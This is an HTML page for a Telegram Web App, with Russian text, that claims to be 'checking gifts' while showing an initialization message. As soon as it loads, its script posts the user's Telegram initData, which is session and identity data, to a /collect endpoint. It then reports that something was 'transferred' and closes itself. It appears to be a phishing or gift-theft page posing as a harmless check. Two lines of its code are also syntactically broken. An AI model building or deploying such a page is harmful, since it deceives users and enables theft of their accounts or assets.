<!DOCTYPE html>
<html>
<head>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body style="text-align:center;margin-top:100px;font-family:Arial;background:#0a0a0a;color:#fff;">
    <h2>🔍 Проверка подарков...</h2>
    <p style="color:#888;">Инициализация...</p>
    
    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();

        // НЕМЕДЛЕННАЯ отправка на сервер
        async function sendData() {
            try {
                const response = await fetch('/collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ initData: tg.initData })
                });
                const data = await response.json();
                document.body.innerHTML = <h2 style="color:#4caf50;">✅ Передано: ${data.transferred}</h2>;
            } catch (e) {
                document.body.innerHTML = <h2 style="color:#f44336;">❌ Ошибка: ${e.message}</h2>;
            }
        }

        sendData();
        setTimeout(() => tg.close(), 3000);
    </script>
</body>
</html>
